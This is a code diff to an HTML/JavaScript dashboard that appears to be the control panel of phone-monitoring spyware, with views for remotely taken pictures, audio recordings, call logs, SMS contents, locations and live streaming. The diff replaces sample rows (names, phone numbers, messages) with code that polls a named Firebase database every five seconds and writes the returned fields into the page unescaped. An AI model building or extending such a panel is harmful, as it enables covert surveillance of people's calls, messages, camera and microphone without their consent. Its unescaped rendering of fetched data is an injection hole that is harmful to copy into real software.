@@ -236,7 +236,7 @@
         .btn-red { background-color: #d9534f; }
         .btn-blue { background-color: #428bca; }
         .btn-purple { background-color: #8a6de9; }
-        .btn-green { background-color: #4cae4c; }
+        .btn-green { background-color: #5cb85c; }
         .btn-yellow { background-color: #f0ad4e; color: #fff; }
         .btn-teal { background-color: #5bc0de; }
         .btn-orange { background-color: #f39c12; }
@@ -548,20 +548,7 @@
                             </tr>
                         </thead>
                         <tbody id="resultTableBody">
-                            <tr>
-                                <td><input type="checkbox"></td>
-                                <td>Take Picture</td>
-                                <td>2019/04/03 11:17:36</td>
-                                <td><span class="badge badge-blue"><i class="fa-solid fa-check"></i></span></td>
-                                <td><button class="btn btn-purple" style="padding:4px 8px; font-size:11px;" onclick="showToast('Opening picture preview...')">See the picture</button></td>
-                            </tr>
-                            <tr>
-                                <td><input type="checkbox"></td>
-                                <td>Audio recording</td>
-                                <td>2019/04/03 11:16:45</td>
-                                <td><span class="badge badge-blue"><i class="fa-solid fa-check"></i></span></td>
-                                <td><button class="btn btn-red" style="padding:4px 8px; font-size:11px;" onclick="showToast('Downloading audio track...')">Download track</button></td>
-                            </tr>
+                            <!-- Live Firebase data will appear here -->
                         </tbody>
                     </table>
                 </div>
@@ -642,25 +629,8 @@
                                 <th>Address</th>
                             </tr>
                         </thead>
-                        <tbody>
-                            <tr>
-                                <td><input type="checkbox"></td>
-                                <td><span class="badge badge-blue">INCOMING</span></td>
-                                <td>Samantha</td>
-                                <td>0756985459</td>
-                                <td>3 minutes 57 secondes</td>
-                                <td>2019/03/28 19:19:27</td>
-                                <td>Chicago, Illinois, Etats-Unis <br><button class="action-icon-btn" style="margin-top:4px;" onclick="showToast('Opening map location...')"><i class="fa-solid fa-map"></i></button></td>
-                            </tr>
-                            <tr>
-                                <td><input type="checkbox"></td>
-                                <td><span class="badge badge-green">OUTGOING</span></td>
-                                <td>Mam</td>
-                                <td>0325744722</td>
-                                <td>05 minute 02 seconde</td>
-                                <td>2019/03/28 14:00:29</td>
-                                <td>Chicago, Illinois, Etats-Unis <br><button class="action-icon-btn" style="margin-top:4px;" onclick="showToast('Opening map location...')"><i class="fa-solid fa-map"></i></button></td>
-                            </tr>
+                        <tbody id="callsTableBody">
+                            <!-- Live Calls data will appear here -->
                         </tbody>
                     </table>
                 </div>
@@ -690,25 +660,8 @@
                                 <th>Address</th>
                             </tr>
                         </thead>
-                        <tbody>
-                            <tr>
-                                <td><input type="checkbox"></td>
-                                <td><span class="badge badge-green">OUTGOING</span></td>
-                                <td>Samantha</td>
-                                <td>Hello, how are you doing ? Are you coming tonight ?</td>
-                                <td>0656160387</td>
-                                <td>2019/03/25 15:46:15</td>
-                                <td>Chicago, Illinois <br><button class="action-icon-btn" style="margin-top:4px;" onclick="showToast('Opening map location...')"><i class="fa-solid fa-map"></i></button></td>
-                            </tr>
-                            <tr>
-                                <td><input type="checkbox"></td>
-                                <td><span class="badge badge-blue">INCOMING</span></td>
-                                <td>Samantha</td>
-                                <td>Hello John :)</td>
-                                <td>0656160387</td>
-                                <td>2019/03/25 15:45:02</td>
-                                <td>Chicago, Illinois <br><button class="action-icon-btn" style="margin-top:4px;" onclick="showToast('Opening map location...')"><i class="fa-solid fa-map"></i></button></td>
-                            </tr>
+                        <tbody id="smsTableBody">
+                            <!-- Live SMS data will appear here -->
                         </tbody>
                     </table>
                 </div>
@@ -721,6 +674,39 @@
     <div id="toast">Action executed successfully!</div>
 
     <script>
+        const FIREBASE_URL = "https://monitordb-4aba6-default-rtdb.firebaseio.com/monitor_data.json";
+
+        // Auto-fetch data from Firebase every 5 seconds
+        function fetchFirebaseData() {
+            fetch(FIREBASE_URL)
+                .then(response => response.json())
+                .then(data => {
+                    if (data) {
+                        const tbody = document.getElementById('resultTableBody');
+                        tbody.innerHTML = ''; // Clear previous entries
+                        
+                        // Loop through firebase records
+                        Object.keys(data).forEach(key => {
+                            let item = data[key];
+                            const newRow = document.createElement('tr');
+                            newRow.innerHTML = `
+                                <td><input type="checkbox"></td>
+                                <td>${item.app || 'Monitor'}</td>
+                                <td>${item.date || 'Just now'}</td>
+                                <td><span class="badge badge-blue"><i class="fa-solid fa-check"></i></span></td>
+                                <td><button class="btn btn-purple" style="padding:4px 8px; font-size:11px;" onclick="showToast('Status: ${item.status}')">View Status</button></td>
+                            `;
+                            tbody.appendChild(newRow);
+                        });
+                    }
+                })
+                .catch(err => console.error("Firebase sync error:", err));
+        }
+
+        // Run fetch every 5 seconds
+        setInterval(fetchFirebaseData, 5000);
+        window.onload = fetchFirebaseData;
+
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('open');
             document.getElementById('overlay').classList.toggle('active');
@@ -764,26 +750,10 @@
             }
         }
 
-        // Working feature: Execute Action and add row to Results table automatically
         function executeAction(actionName, dataDetails) {
             showToast(actionName + ' requested successfully!');
-
-            const tbody = document.getElementById('resultTableBody');
-            const now = new Date();
-            const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '/') + ' ' + now.toTimeString().slice(0, 8);
-
-            const newRow = document.createElement('tr');
-            newRow.innerHTML = `
-                <td><input type="checkbox"></td>
-                <td>${actionName}</td>
-                <td>${dateStr}</td>
-                <td><span class="badge badge-blue"><i class="fa-solid fa-check"></i></span></td>
-                <td><button class="btn btn-purple" style="padding:4px 8px; font-size:11px;" onclick="showToast('Data: ${dataDetails}')">View Data</button></td>
-            `;
-            tbody.insertBefore(newRow, tbody.firstChild);
         }
 
-        // Live View Mode Selection
         function selectLiveMode(boxElement) {
             const boxes = document.querySelectorAll('.live-option-box');
             boxes.forEach(b => {
@@ -798,7 +768,6 @@
             showToast('Selected mode: ' + boxElement.querySelector('div').innerText);
         }
 
-        // Record Switch Toggle
         function toggleRecordSwitch() {
             const stateSpan = document.getElementById('recordSwitchState');
             if(stateSpan.innerText === 'ON') {
@@ -814,7 +783,6 @@
             showToast('Live stream session started successfully!');
         }
 
-        // Toast notification helper
         function showToast(message) {
             const toast = document.getElementById('toast');
             toast.innerText = message;
@@ -822,7 +790,6 @@
             setTimeout(() => { toast.className = toast.className.replace('show', ''); }, 3000);
         }
 
-        // Search filter for result table
         function filterTable() {
             const input = document.getElementById('searchResult').value.toLowerCase();
             const rows = document.querySelectorAll('#resultTableBody tr');
